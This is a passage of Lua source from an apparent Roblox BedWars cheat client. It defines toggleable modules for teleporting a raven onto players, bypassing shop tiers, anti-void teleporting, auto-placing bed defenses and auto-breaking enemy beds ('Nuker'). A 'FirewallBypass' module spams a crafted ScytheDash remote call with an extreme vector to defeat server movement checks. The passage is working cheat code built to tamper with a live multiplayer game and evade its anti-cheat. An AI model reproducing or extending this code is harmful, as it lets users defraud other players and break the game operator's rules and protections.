								if projectile then
									local projectilemodel = projectile
									if not projectilemodel then
										projectilemodel:GetPropertyChangedSignal("PrimaryPart"):Wait()
									end
									local bodyforce = Instance.new("BodyForce")
									bodyforce.Force = Vector3.new(0, projectilemodel.PrimaryPart.AssemblyMass * workspace.Gravity, 0)
									bodyforce.Name = "AntiGravity"
									bodyforce.Parent = projectilemodel.PrimaryPart
	
									if plr then
										projectilemodel:SetPrimaryPartCFrame(CFrame.new(plr.RootPart.CFrame.p, plr.RootPart.CFrame.p + gameCamera.CFrame.lookVector))
										task.wait(0.3)
										bedwars.RavenTable:detonateRaven()
									else
										warningNotification("RavenTP", "Player died before it could TP.", 3)
									end
								else
									warningNotification("RavenTP", "Raven on cooldown.", 3)
								end
							end)
						else
							warningNotification("RavenTP", "Player not found.", 3)
						end
					else
						warningNotification("RavenTP", "Raven not found.", 3)
					end
				end)
				RavenTP.ToggleButton(true)
			end
		end,
		HoverText = "Spawns and teleports a raven to a player\nnear your mouse."
	})
end)

runFunction(function()
	local tiered = {}
	local nexttier = {}

	for i,v in pairs(bedwars.ShopItems) do
		if type(v) == "table" then 
			if v.tiered then
				tiered[v.itemType] = v.tiered
			end
			if v.nextTier then
				nexttier[v.itemType] = v.nextTier
			end
		end
	end

	GuiLibrary.ObjectsThatCanBeSaved.UtilityWindow.Api.CreateOptionsButton({
		Name = "ShopTierBypass",
		Function = function(callback) 
			if callback then
				for i,v in pairs(bedwars.ShopItems) do
					if type(v) == "table" then 
						v.tiered = nil
						v.nextTier = nil
					end
				end
			else
				for i,v in pairs(bedwars.ShopItems) do
					if type(v) == "table" then 
						if tiered[v.itemType] then
							v.tiered = tiered[v.itemType]
						end
						if nexttier[v.itemType] then
							v.nextTier = nexttier[v.itemType]
						end
					end
				end
			end
		end,
		HoverText = "Allows you to access tiered items early."
	})
end)

local lagbackedaftertouch = false
runFunction(function()
	local AntiVoidPart
	local AntiVoidConnection
	local AntiVoidMode = {Value = "Normal"}
	local AntiVoidMoveMode = {Value = "Normal"}
	local AntiVoid = {Enabled = false}
	local AntiVoidTransparent = {Value = 50}
	local AntiVoidColor = {Hue = 1, Sat = 1, Value = 0.55}
	local lastvalidpos

	local function closestpos(block)
		local startpos = block.Position - (block.Size / 2) + Vector3.new(1.5, 1.5, 1.5)
		local endpos = block.Position + (block.Size / 2) - Vector3.new(1.5, 1.5, 1.5)
		local newpos = block.Position + (entityLibrary.character.HumanoidRootPart.Position - block.Position)
		return Vector3.new(math.clamp(newpos.X, startpos.X, endpos.X), endpos.Y + 3, math.clamp(newpos.Z, startpos.Z, endpos.Z))
	end

	local function getclosesttop(newmag)
		local closest, closestmag = nil, newmag * 3
		if entityLibrary.isAlive then 
			local tops = {}
			for i,v in pairs(bedwarsStore.blocks) do 
				local close = getScaffold(closestpos(v), false)
				if getPlacedBlock(close) then continue end
				if close.Y < entityLibrary.character.HumanoidRootPart.Position.Y then continue end
				if (close - entityLibrary.character.HumanoidRootPart.Position).magnitude <= newmag * 3 then 
					table.insert(tops, close)
				end
			end
			for i,v in pairs(tops) do 
				local mag = (v - entityLibrary.character.HumanoidRootPart.Position).magnitude
				if mag <= closestmag then 
					closest = v
					closestmag = mag
				end
			end
		end
		return closest
	end

	local antivoidypos = 0
	local antivoiding = false
	AntiVoid = GuiLibrary.ObjectsThatCanBeSaved.WorldWindow.Api.CreateOptionsButton({
		Name = "AntiVoid", 
		Function = function(callback)
			if callback then
				task.spawn(function()
					AntiVoidPart = Instance.new("Part")
					AntiVoidPart.CanCollide = AntiVoidMode.Value == "Collide"
					AntiVoidPart.Size = Vector3.new(10000, 1, 10000)
					AntiVoidPart.Anchored = true
					AntiVoidPart.Material = Enum.Material.Neon
					AntiVoidPart.Color = Color3.fromHSV(AntiVoidColor.Hue, AntiVoidColor.Sat, AntiVoidColor.Value)
					AntiVoidPart.Transparency = 1 - (AntiVoidTransparent.Value / 100)
					AntiVoidPart.Position = Vector3.new(0, antivoidypos, 0)
					AntiVoidPart.Parent = workspace
					if AntiVoidMoveMode.Value == "Classic" and antivoidypos == 0 then 
						AntiVoidPart.Parent = nil
					end
					AntiVoidConnection = AntiVoidPart.Touched:Connect(function(touchedpart)
						if touchedpart.Parent == lplr.Character and entityLibrary.isAlive then
							if (not antivoiding) and (not GuiLibrary.ObjectsThatCanBeSaved.FlyOptionsButton.Api.Enabled) and entityLibrary.character.Humanoid.Health > 0 and AntiVoidMode.Value ~= "Collide" then
								if AntiVoidMode.Value == "Velocity" then
									entityLibrary.character.HumanoidRootPart.Velocity = Vector3.new(entityLibrary.character.HumanoidRootPart.Velocity.X, 100, entityLibrary.character.HumanoidRootPart.Velocity.Z)
								else
									antivoiding = true
									local pos = getclosesttop(1000)
									if pos then
										local lastTeleport = lplr:GetAttribute("LastTeleported")
										RunLoops:BindToHeartbeat("AntiVoid", function(dt)
											if entityLibrary.isAlive and entityLibrary.character.Humanoid.Health > 0 and isnetworkowner(entityLibrary.character.HumanoidRootPart) and (entityLibrary.character.HumanoidRootPart.Position - pos).Magnitude > 1 and AntiVoid.Enabled and lplr:GetAttribute("LastTeleported") == lastTeleport then 
												local hori1 = Vector3.new(entityLibrary.character.HumanoidRootPart.Position.X, 0, entityLibrary.character.HumanoidRootPart.Position.Z)
												local hori2 = Vector3.new(pos.X, 0, pos.Z)
												local newpos = (hori2 - hori1).Unit
												local realnewpos = CFrame.new(newpos == newpos and entityLibrary.character.HumanoidRootPart.CFrame.p + (newpos * ((3 + getSpeed()) * dt)) or Vector3.zero)
												entityLibrary.character.HumanoidRootPart.CFrame = CFrame.new(realnewpos.p.X, pos.Y, realnewpos.p.Z)
												antivoidvelo = newpos == newpos and newpos * 20 or Vector3.zero
												entityLibrary.character.HumanoidRootPart.Velocity = Vector3.new(antivoidvelo.X, entityLibrary.character.HumanoidRootPart.Velocity.Y, antivoidvelo.Z)
												if getPlacedBlock((entityLibrary.character.HumanoidRootPart.CFrame.p - Vector3.new(0, 1, 0)) + entityLibrary.character.HumanoidRootPart.Velocity.Unit) or getPlacedBlock(entityLibrary.character.HumanoidRootPart.CFrame.p + Vector3.new(0, 3)) then
													pos = pos + Vector3.new(0, 1, 0)
												end
											else
												RunLoops:UnbindFromHeartbeat("AntiVoid")
												antivoidvelo = nil
												antivoiding = false
											end
										end)
									else
										entityLibrary.character.HumanoidRootPart.CFrame += Vector3.new(0, 100000, 0)
										antivoiding = false
									end
								end
							end
						end
					end)
					repeat
						if entityLibrary.isAlive and AntiVoidMoveMode.Value == "Normal" then 
							local ray = workspace:Raycast(entityLibrary.character.HumanoidRootPart.Position, Vector3.new(0, -1000, 0), bedwarsStore.blockRaycast)
							if ray or GuiLibrary.ObjectsThatCanBeSaved.FlyOptionsButton.Api.Enabled or GuiLibrary.ObjectsThatCanBeSaved.InfiniteFlyOptionsButton.Api.Enabled then 
								AntiVoidPart.Position = entityLibrary.character.HumanoidRootPart.Position - Vector3.new(0, 21, 0)
							end
						end
						task.wait()
					until (not AntiVoid.Enabled)
				end)
			else
				if AntiVoidConnection then AntiVoidConnection:Disconnect() end
				if AntiVoidPart then
					AntiVoidPart:Destroy() 
				end
			end
		end, 
		HoverText = "Gives you a chance to get on land (Bouncing Twice, abusing, or bad luck will lead to lagbacks)"
	})
	AntiVoidMoveMode = AntiVoid.CreateDropdown({
		Name = "Position Mode",
		Function = function(val) 
			if val == "Classic" then 
				task.spawn(function()
					repeat task.wait() until bedwarsStore.matchState ~= 0 or not vapeInjected
					if vapeInjected and AntiVoidMoveMode.Value == "Classic" and antivoidypos == 0 and AntiVoid.Enabled then
						local lowestypos = 99999
						for i,v in pairs(bedwarsStore.blocks) do 
							local newray = workspace:Raycast(v.Position + Vector3.new(0, 800, 0), Vector3.new(0, -1000, 0), bedwarsStore.blockRaycast)
							if i % 200 == 0 then 
								task.wait(0.06)
							end
							if newray and newray.Position.Y <= lowestypos then
								lowestypos = newray.Position.Y
							end
						end
						antivoidypos = lowestypos - 8
					end
					if AntiVoidPart then 
						AntiVoidPart.Position = Vector3.new(0, antivoidypos, 0)
						AntiVoidPart.Parent = workspace
					end
				end)
			end
		end,
		List = {"Normal", "Classic"}
	})
	AntiVoidMode = AntiVoid.CreateDropdown({
		Name = "Move Mode",
		Function = function(val) 
			if AntiVoidPart then 
				AntiVoidPart.CanCollide = val == "Collide"
			end
		end,
		List = {"Normal", "Collide", "Velocity"}
	})
	AntiVoidTransparent = AntiVoid.CreateSlider({
		Name = "Invisible",
		Min = 1,
		Max = 100,
		Default = 50,
		Function = function(val) 
			if AntiVoidPart then
				AntiVoidPart.Transparency = 1 - (val / 100)
			end
		end,
	})
	AntiVoidColor = AntiVoid.CreateColorSlider({
		Name = "Color",
		Function = function(h, s, v) 
			if AntiVoidPart then
				AntiVoidPart.Color = Color3.fromHSV(h, s, v)
			end
		end
	})
end)

runFunction(function()
	local oldenable2
	local olddisable2
	local oldhitblock
	local blockplacetable2 = {}
	local blockplaceenabled2 = false

	local AutoTool = GuiLibrary.ObjectsThatCanBeSaved.WorldWindow.Api.CreateOptionsButton({
		Name = "AutoTool",
		Function = function(callback)
			if callback then
				oldenable2 = bedwars.BlockBreaker.enable
				olddisable2 = bedwars.BlockBreaker.disable
				oldhitblock = bedwars.BlockBreaker.hitBlock
				bedwars.BlockBreaker.enable = function(Self, tab)
					blockplaceenabled2 = true
					blockplacetable2 = Self
					return oldenable2(Self, tab)
				end
				bedwars.BlockBreaker.disable = function(Self)
					blockplaceenabled2 = false
					return olddisable2(Self)
				end
				bedwars.BlockBreaker.hitBlock = function(...)
					if entityLibrary.isAlive and (GuiLibrary.ObjectsThatCanBeSaved["Lobby CheckToggle"].Api.Enabled == false or bedwarsStore.matchState ~= 0) and blockplaceenabled2 then
						local mouseinfo = blockplacetable2.clientManager:getBlockSelector():getMouseInfo(0)
						if mouseinfo and mouseinfo.target and not mouseinfo.target.blockInstance:GetAttribute("NoBreak") and not mouseinfo.target.blockInstance:GetAttribute("Team"..(lplr:GetAttribute("Team") or 0).."NoBreak") then
							if switchToAndUseTool(mouseinfo.target.blockInstance, true) then
								return
							end
						end
					end
					return oldhitblock(...)
				end
			else
				RunLoops:UnbindFromRenderStep("AutoTool")
				bedwars.BlockBreaker.enable = oldenable2
				bedwars.BlockBreaker.disable = olddisable2
				bedwars.BlockBreaker.hitBlock = oldhitblock
				oldenable2 = nil
				olddisable2 = nil
				oldhitblock = nil
			end
		end,
		HoverText = "Automatically swaps your hand to the appropriate tool."
	})
end)

runFunction(function()
	local BedProtector = {Enabled = false}
	local bedprotector1stlayer = {
		Vector3.new(0, 3, 0),
		Vector3.new(0, 3, 3),
		Vector3.new(3, 0, 0),
		Vector3.new(3, 0, 3),
		Vector3.new(-3, 0, 0),
		Vector3.new(-3, 0, 3),
		Vector3.new(0, 0, 6),
		Vector3.new(0, 0, -3)
	}
	local bedprotector2ndlayer = {
		Vector3.new(0, 6, 0),
		Vector3.new(0, 6, 3),
		Vector3.new(0, 3, 6),
		Vector3.new(0, 3, -3),
		Vector3.new(0, 0, -6),
		Vector3.new(0, 0, 9),
		Vector3.new(3, 3, 0),
		Vector3.new(3, 3, 3),
		Vector3.new(3, 0, 6),
		Vector3.new(3, 0, -3),
		Vector3.new(6, 0, 3),
		Vector3.new(6, 0, 0),
		Vector3.new(-3, 3, 3),
		Vector3.new(-3, 3, 0),
		Vector3.new(-6, 0, 3),
		Vector3.new(-6, 0, 0),
		Vector3.new(-3, 0, 6),
		Vector3.new(-3, 0, -3),
	}

	local function getItemFromList(list)
		local selecteditem
		for i3,v3 in pairs(list) do
			local item = getItem(v3)
			if item then 
				selecteditem = item
				break
			end
		end
		return selecteditem
	end

	local function placelayer(layertab, obj, selecteditems)
		for i2,v2 in pairs(layertab) do
			local selecteditem = getItemFromList(selecteditems)
			if selecteditem then
				bedwars.placeBlock(obj.Position + v2, selecteditem.itemType)
			else
				return false
			end
		end
		return true
	end

	local bedprotectorrange = {Value = 1}
	BedProtector = GuiLibrary.ObjectsThatCanBeSaved.WorldWindow.Api.CreateOptionsButton({
		Name = "BedProtector",
		Function = function(callback)
            if callback then
                task.spawn(function()
                    for i, obj in pairs(collectionService:GetTagged("bed")) do
                        if entityLibrary.isAlive and obj:GetAttribute("Team"..(lplr:GetAttribute("Team") or 0).."NoBreak") and obj.Parent ~= nil then
                            if (entityLibrary.character.HumanoidRootPart.Position - obj.Position).magnitude <= bedprotectorrange.Value then
                                local firstlayerplaced = placelayer(bedprotector1stlayer, obj, {"obsidian", "stone_brick", "plank_oak", getWool()})
							    if firstlayerplaced then
									placelayer(bedprotector2ndlayer, obj, {getWool()})
							    end
                            end
                            break
                        end
                    end
                    BedProtector.ToggleButton(false)
                end)
            end
		end,
		HoverText = "Automatically places a bed defense (Toggle)"
	})
	bedprotectorrange = BedProtector.CreateSlider({
		Name = "Place range",
		Min = 1, 
		Max = 20, 
		Function = function(val) end, 
		Default = 20
	})
end)

runFunction(function()
	local Nuker = {Enabled = false}
	local nukerrange = {Value = 1}
	local nukereffects = {Enabled = false}
	local nukeranimation = {Enabled = false}
	local nukernofly = {Enabled = false}
	local nukerlegit = {Enabled = false}
	local nukerown = {Enabled = false}
    local nukerluckyblock = {Enabled = false}
	local nukerironore = {Enabled = false}
    local nukerbeds = {Enabled = false}
	local nukercustom = {RefreshValues = function() end, ObjectList = {}}
    local luckyblocktable = {}

	Nuker = GuiLibrary.ObjectsThatCanBeSaved.WorldWindow.Api.CreateOptionsButton({
		Name = "Nuker",
		Function = function(callback)
            if callback then
				for i,v in pairs(bedwarsStore.blocks) do
					if table.find(nukercustom.ObjectList, v.Name) or (nukerluckyblock.Enabled and v.Name:find("lucky")) or (nukerironore.Enabled and v.Name == "iron_ore") then
						table.insert(luckyblocktable, v)
					end
				end
				table.insert(Nuker.Connections, collectionService:GetInstanceAddedSignal("block"):Connect(function(v)
                    if table.find(nukercustom.ObjectList, v.Name) or (nukerluckyblock.Enabled and v.Name:find("lucky")) or (nukerironore.Enabled and v.Name == "iron_ore") then
                        table.insert(luckyblocktable, v)
                    end
                end))
                table.insert(Nuker.Connections, collectionService:GetInstanceRemovedSignal("block"):Connect(function(v)
                    if table.find(nukercustom.ObjectList, v.Name) or (nukerluckyblock.Enabled and v.Name:find("lucky")) or (nukerironore.Enabled and v.Name == "iron_ore") then
                        table.remove(luckyblocktable, table.find(luckyblocktable, v))
                    end
                end))
                task.spawn(function()
                    repeat
						if (not nukernofly.Enabled or not GuiLibrary.ObjectsThatCanBeSaved.FlyOptionsButton.Api.Enabled) then
							local broke = not entityLibrary.isAlive
							local tool = (not nukerlegit.Enabled) and {Name = "wood_axe"} or bedwarsStore.localHand.tool
							if nukerbeds.Enabled then
								for i, obj in pairs(collectionService:GetTagged("bed")) do
									if broke then break end
									if obj.Parent ~= nil then
										if obj:GetAttribute("BedShieldEndTime") then 
											if obj:GetAttribute("BedShieldEndTime") > workspace:GetServerTimeNow() then continue end
										end
										if ((entityLibrary.LocalPosition or entityLibrary.character.HumanoidRootPart.Position) - obj.Position).magnitude <= nukerrange.Value then
											if tool and bedwars.ItemTable[tool.Name].breakBlock and bedwars.BlockController:isBlockBreakable({blockPosition = obj.Position / 3}, lplr) then
												local res, amount = getBestBreakSide(obj.Position)
												local res2, amount2 = getBestBreakSide(obj.Position + Vector3.new(0, 0, 3))
												broke = true
												bedwars.breakBlock((amount < amount2 and obj.Position or obj.Position + Vector3.new(0, 0, 3)), nukereffects.Enabled, (amount < amount2 and res or res2), false, nukeranimation.Enabled)
												break
											end
										end
									end
								end
							end
							broke = broke and not entityLibrary.isAlive
							for i, obj in pairs(luckyblocktable) do
								if broke then break end
								if entityLibrary.isAlive then
									if obj and obj.Parent ~= nil then
										if ((entityLibrary.LocalPosition or entityLibrary.character.HumanoidRootPart.Position) - obj.Position).magnitude <= nukerrange.Value and (nukerown.Enabled or obj:GetAttribute("PlacedByUserId") ~= lplr.UserId) then
											if tool and bedwars.ItemTable[tool.Name].breakBlock and bedwars.BlockController:isBlockBreakable({blockPosition = obj.Position / 3}, lplr) then
												bedwars.breakBlock(obj.Position, nukereffects.Enabled, getBestBreakSide(obj.Position), true, nukeranimation.Enabled)
												break
											end
										end
									end
								end
							end
						end
						task.wait()
                    until (not Nuker.Enabled)
                end)
            else
                luckyblocktable = {}
            end
		end,
		HoverText = "Automatically destroys beds & luckyblocks around you."
	})
	nukerrange = Nuker.CreateSlider({
		Name = "Break range",
		Min = 1, 
		Max = 30, 
		Function = function(val) end, 
		Default = 30
	})
	nukerlegit = Nuker.CreateToggle({
		Name = "Hand Check",
		Function = function() end
	})
	nukereffects = Nuker.CreateToggle({
		Name = "Show HealthBar & Effects",
		Function = function(callback) 
			if not callback then
				bedwars.BlockBreaker.healthbarMaid:DoCleaning()
			end
		 end,
		Default = true
	})
	nukeranimation = Nuker.CreateToggle({
		Name = "Break Animation",
		Function = function() end
	})
	nukerown = Nuker.CreateToggle({
		Name = "Self Break",
		Function = function() end,
	})
    nukerbeds = Nuker.CreateToggle({
		Name = "Break Beds",
		Function = function(callback) end,
		Default = true
	})
	nukernofly = Nuker.CreateToggle({
		Name = "Fly Disable",
		Function = function() end
	})
    nukerluckyblock = Nuker.CreateToggle({
		Name = "Break LuckyBlocks",
		Function = function(callback) 
			if callback then 
				luckyblocktable = {}
				for i,v in pairs(bedwarsStore.blocks) do
					if table.find(nukercustom.ObjectList, v.Name) or (nukerluckyblock.Enabled and v.Name:find("lucky")) or (nukerironore.Enabled and v.Name == "iron_ore") then
						table.insert(luckyblocktable, v)
					end
				end
			else
				luckyblocktable = {}
			end
		 end,
		Default = true
	})
	nukerironore = Nuker.CreateToggle({
		Name = "Break IronOre",
		Function = function(callback) 
			if callback then 
				luckyblocktable = {}
				for i,v in pairs(bedwarsStore.blocks) do
					if table.find(nukercustom.ObjectList, v.Name) or (nukerluckyblock.Enabled and v.Name:find("lucky")) or (nukerironore.Enabled and v.Name == "iron_ore") then
						table.insert(luckyblocktable, v)
					end
				end
			else
				luckyblocktable = {}
			end
		end
	})
	nukercustom = Nuker.CreateTextList({
		Name = "NukerList",
		TempText = "block (tesla_trap)",
		AddFunction = function()
			luckyblocktable = {}
			for i,v in pairs(bedwarsStore.blocks) do
				if table.find(nukercustom.ObjectList, v.Name) or (nukerluckyblock.Enabled and v.Name:find("lucky")) then
					table.insert(luckyblocktable, v)
				end
			end
		end
	})
end)


runFunction(function()
	local controlmodule = require(lplr.PlayerScripts.PlayerModule).controls
	local oldmove
	local SafeWalk = {Enabled = false}
	local SafeWalkMode = {Value = "Optimized"}
	SafeWalk = GuiLibrary.ObjectsThatCanBeSaved.WorldWindow.Api.CreateOptionsButton({
		Name = "SafeWalk",
		Function = function(callback)
			if callback then
				oldmove = controlmodule.moveFunction
				controlmodule.moveFunction = function(Self, vec, facecam)
					if entityLibrary.isAlive and (not Scaffold.Enabled) and (not GuiLibrary.ObjectsThatCanBeSaved.FlyOptionsButton.Api.Enabled) then
						if SafeWalkMode.Value == "Optimized" then 
							local newpos = (entityLibrary.character.HumanoidRootPart.Position - Vector3.new(0, entityLibrary.character.Humanoid.HipHeight * 2, 0))
							local ray = getPlacedBlock(newpos + Vector3.new(0, -6, 0) + vec)
							for i = 1, 50 do 
								if ray then break end
								ray = getPlacedBlock(newpos + Vector3.new(0, -i * 6, 0) + vec)
							end
							local ray2 = getPlacedBlock(newpos)
							if ray == nil and ray2 then
								local ray3 = getPlacedBlock(newpos + vec) or getPlacedBlock(newpos + (vec * 1.5))
								if ray3 == nil then 
									vec = Vector3.zero
								end
							end
						else
							local ray = workspace:Raycast(entityLibrary.character.HumanoidRootPart.Position + vec, Vector3.new(0, -1000, 0), bedwarsStore.blockRaycast)
							local ray2 = workspace:Raycast(entityLibrary.character.HumanoidRootPart.Position, Vector3.new(0, -entityLibrary.character.Humanoid.HipHeight * 2, 0), bedwarsStore.blockRaycast)
							if ray == nil and ray2 then
								local ray3 = workspace:Raycast(entityLibrary.character.HumanoidRootPart.Position + (vec * 1.8), Vector3.new(0, -1000, 0), bedwarsStore.blockRaycast)
								if ray3 == nil then 
									vec = Vector3.zero
								end
							end
						end
					end
					return oldmove(Self, vec, facecam)
				end
			else
				controlmodule.moveFunction = oldmove
			end
		end,
		HoverText = "lets you not walk off because you are bad"
	})
	SafeWalkMode = SafeWalk.CreateDropdown({
		Name = "Mode",
		List = {"Optimized", "Accurate"},
		Function = function() end
	})
end)

runFunction(function()
	local Schematica = {Enabled = false}
	local SchematicaBox = {Value = ""}
	local SchematicaTransparency = {Value = 30}
	local positions = {}
	local tempfolder
	local tempgui
	local aroundpos = {
		[1] = Vector3.new(0, 3, 0),
		[2] = Vector3.new(-3, 3, 0),
		[3] = Vector3.new(-3, -0, 0),
		[4] = Vector3.new(-3, -3, 0),
		[5] = Vector3.new(0, -3, 0),
		[6] = Vector3.new(3, -3, 0),
		[7] = Vector3.new(3, -0, 0),
		[8] = Vector3.new(3, 3, 0),
		[9] = Vector3.new(0, 3, -3),
		[10] = Vector3.new(-3, 3, -3),
		[11] = Vector3.new(-3, -0, -3),
		[12] = Vector3.new(-3, -3, -3),
		[13] = Vector3.new(0, -3, -3),
		[14] = Vector3.new(3, -3, -3),
		[15] = Vector3.new(3, -0, -3),
		[16] = Vector3.new(3, 3, -3),
		[17] = Vector3.new(0, 3, 3),
		[18] = Vector3.new(-3, 3, 3),
		[19] = Vector3.new(-3, -0, 3),
		[20] = Vector3.new(-3, -3, 3),
		[21] = Vector3.new(0, -3, 3),
		[22] = Vector3.new(3, -3, 3),
		[23] = Vector3.new(3, -0, 3),
		[24] = Vector3.new(3, 3, 3),
		[25] = Vector3.new(0, -0, 3),
		[26] = Vector3.new(0, -0, -3)
	}

	local function isNearBlock(pos)
		for i,v in pairs(aroundpos) do
			if getPlacedBlock(pos + v) then
				return true
			end
		end
		return false
	end

	local function gethighlightboxatpos(pos)
		if tempfolder then
			for i,v in pairs(tempfolder:GetChildren()) do
				if v.Position == pos then
					return v 
				end
			end
		end
		return nil
	end

	local function removeduplicates(tab)
		local actualpositions = {}
		for i,v in pairs(tab) do
			if table.find(actualpositions, Vector3.new(v.X, v.Y, v.Z)) == nil then
				table.insert(actualpositions, Vector3.new(v.X, v.Y, v.Z))
			else
				table.remove(tab, i)
			end
			if v.blockType == "start_block" then
				table.remove(tab, i)
			end
		end
	end

	local function rotate(tab)
		for i,v in pairs(tab) do
			local radvec, radius = entityLibrary.character.HumanoidRootPart.CFrame:ToAxisAngle()
			radius = (radius * 57.2957795)
			radius = math.round(radius / 90) * 90
			if radvec == Vector3.new(0, -1, 0) and radius == 90 then
				radius = 270
			end
			local rot = CFrame.new() * CFrame.fromAxisAngle(Vector3.new(0, 1, 0), math.rad(radius))
			local newpos = CFrame.new(0, 0, 0) * rot * CFrame.new(Vector3.new(v.X, v.Y, v.Z))
			v.X = math.round(newpos.p.X)
			v.Y = math.round(newpos.p.Y)
			v.Z = math.round(newpos.p.Z)
		end
	end

	local function getmaterials(tab)
		local materials = {}
		for i,v in pairs(tab) do
			materials[v.blockType] = (materials[v.blockType] and materials[v.blockType] + 1 or 1)
		end
		return materials
	end

	local function schemplaceblock(pos, blocktype, removefunc)
		local fail = false
		local ok = bedwars.RuntimeLib.try(function()
			bedwars.ClientHandlerDamageBlock:Get("PlaceBlock"):CallServer({
				blockType = blocktype or getWool(),
				position = bedwars.BlockController:getBlockPosition(pos)
			})
		end, function(thing)
			fail = true
		end)
		if (not fail) and bedwars.BlockController:getStore():getBlockAt(bedwars.BlockController:getBlockPosition(pos)) then
			removefunc()
		end
	end

	Schematica = GuiLibrary.ObjectsThatCanBeSaved.WorldWindow.Api.CreateOptionsButton({
		Name = "Schematica",
		Function = function(callback)
			if callback then
				local mouseinfo = bedwars.BlockEngine:getBlockSelector():getMouseInfo(0)
				if mouseinfo and isfile(SchematicaBox.Value) then
					tempfolder = Instance.new("Folder")
					tempfolder.Parent = workspace
					local newpos = mouseinfo.placementPosition * 3
					positions = game:GetService("HttpService"):JSONDecode(readfile(SchematicaBox.Value))
					if positions.blocks == nil then
						positions = {blocks = positions}
					end
					rotate(positions.blocks)
					removeduplicates(positions.blocks)
					if positions["start_block"] == nil then
						bedwars.placeBlock(newpos)
					end
					for i2,v2 in pairs(positions.blocks) do
						local texturetxt = bedwars.ItemTable[(v2.blockType == "wool_white" and getWool() or v2.blockType)].block.greedyMesh.textures[1]
						local newerpos = (newpos + Vector3.new(v2.X, v2.Y, v2.Z))
						local block = Instance.new("Part")
						block.Position = newerpos
						block.Size = Vector3.new(3, 3, 3)
						block.CanCollide = false
						block.Transparency = (SchematicaTransparency.Value == 10 and 0 or 1)
						block.Anchored = true
						block.Parent = tempfolder
						for i3,v3 in pairs(Enum.NormalId:GetEnumItems()) do
							local texture = Instance.new("Texture")
							texture.Face = v3
							texture.Texture = texturetxt
							texture.Name = tostring(v3)
							texture.Transparency = (SchematicaTransparency.Value == 10 and 0 or (1 / SchematicaTransparency.Value))
							texture.Parent = block
						end
					end
					task.spawn(function()
						repeat
							task.wait(.1)
							if not Schematica.Enabled then break end
							for i,v in pairs(positions.blocks) do
								local newerpos = (newpos + Vector3.new(v.X, v.Y, v.Z))
								if entityLibrary.isAlive and (entityLibrary.character.HumanoidRootPart.Position - newerpos).magnitude <= 30 and isNearBlock(newerpos) and bedwars.BlockController:isAllowedPlacement(lplr, getWool(), newerpos / 3, 0) then
									schemplaceblock(newerpos, (v.blockType == "wool_white" and getWool() or v.blockType), function()
										table.remove(positions.blocks, i)
										if gethighlightboxatpos(newerpos) then
											gethighlightboxatpos(newerpos):Remove()
										end
									end)
								end
							end
						until #positions.blocks == 0 or (not Schematica.Enabled)
						if Schematica.Enabled then 
							Schematica.ToggleButton(false)
							warningNotification("Schematica", "Finished Placing Blocks", 4)
						end
					end)
				end
			else
				positions = {}
				if tempfolder then
					tempfolder:Remove()
				end
			end
		end,
		HoverText = "Automatically places structure at mouse position."
	})
	SchematicaBox = Schematica.CreateTextBox({
		Name = "File",
		TempText = "File (location in workspace)",
		FocusLost = function(enter) 
			local suc, res = pcall(function() return game:GetService("HttpService"):JSONDecode(readfile(SchematicaBox.Value)) end)
			if tempgui then
				tempgui:Remove()
			end
			if suc then
				if res.blocks == nil then
					res = {blocks = res}
				end
				removeduplicates(res.blocks)
				tempgui = Instance.new("Frame")
				tempgui.Name = "SchematicListOfBlocks"
				tempgui.BackgroundTransparency = 1
				tempgui.LayoutOrder = 9999
				tempgui.Parent = SchematicaBox.Object.Parent
				local uilistlayoutschmatica = Instance.new("UIListLayout")
				uilistlayoutschmatica.Parent = tempgui
				uilistlayoutschmatica:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
					tempgui.Size = UDim2.new(0, 220, 0, uilistlayoutschmatica.AbsoluteContentSize.Y)
				end)
				for i4,v4 in pairs(getmaterials(res.blocks)) do
					local testframe = Instance.new("Frame")
					testframe.Size = UDim2.new(0, 220, 0, 40)
					testframe.BackgroundTransparency = 1
					testframe.Parent = tempgui
					local testimage = Instance.new("ImageLabel")
					testimage.Size = UDim2.new(0, 40, 0, 40)
					testimage.Position = UDim2.new(0, 3, 0, 0)
					testimage.BackgroundTransparency = 1
					testimage.Image = bedwars.getIcon({itemType = i4}, true)
					testimage.Parent = testframe
					local testtext = Instance.new("TextLabel")
					testtext.Size = UDim2.new(1, -50, 0, 40)
					testtext.Position = UDim2.new(0, 50, 0, 0)
					testtext.TextSize = 20
					testtext.Text = v4
					testtext.Font = Enum.Font.SourceSans
					testtext.TextXAlignment = Enum.TextXAlignment.Left
					testtext.TextColor3 = Color3.new(1, 1, 1)
					testtext.BackgroundTransparency = 1
					testtext.Parent = testframe
				end
			end
		end
	})
	SchematicaTransparency = Schematica.CreateSlider({
		Name = "Transparency",
		Min = 0,
		Max = 10,
		Default = 7,
		Function = function()
			if tempfolder then
				for i2,v2 in pairs(tempfolder:GetChildren()) do
					v2.Transparency = (SchematicaTransparency.Value == 10 and 0 or 1)
					for i3,v3 in pairs(v2:GetChildren()) do
						v3.Transparency = (SchematicaTransparency.Value == 10 and 0 or (1 / SchematicaTransparency.Value))
					end
				end
			end
		end
	})
end)

runFunction(function()
    local Disabler = {Enabled = false}
    Disabler = GuiLibrary.ObjectsThatCanBeSaved.UtilityWindow.Api.CreateOptionsButton({
        Name = "FirewallBypass",
        Function = function(callback)
            if callback then 
				task.spawn(function()
					repeat
						task.wait()
						local item = getItemNear("scythe")
						if item and lplr.Character.HandInvItem.Value == item.tool and bedwars.CombatController then 
							bedwars.ClientHandler:Get("ScytheDash"):SendToServer({direction = Vector3.new(9e9, 9e9, 9e9)})
							if entityLibrary.isAlive and entityLibrary.character.Head.Transparency ~= 0 then
								bedwarsStore.scythe = tick() + 1
							end
						end
					until (not Disabler.Enabled)
				end)
            end
        end,
		HoverText = "Float disabler with scythe"
    })
end)

runFunction(function()
	bedwarsStore.TPString = shared.vapeoverlay or nil
	local origtpstring = bedwarsStore.TPString
	local Overlay = GuiLibrary.CreateCustomWindow({
		Name = "Overlay",
		Icon = "vape/assets/TargetIcon1.png",
		IconSize = 16
	})
	local overlayframe = Instance.new("Frame")
	overlayframe.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
	overlayframe.Size = UDim2.new(0, 200, 0, 120)
	overlayframe.Position = UDim2.new(0, 0, 0, 5)
	overlayframe.Parent = Overlay.GetCustomChildren()
	local overlayframe2 = Instance.new("Frame")
	overlayframe2.Size = UDim2.new(1, 0, 0, 10)
	overlayframe2.Position = UDim2.new(0, 0, 0, -5)
	overlayframe2.Parent = overlayframe
	local overlayframe3 = Instance.new("Frame")
	overlayframe3.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
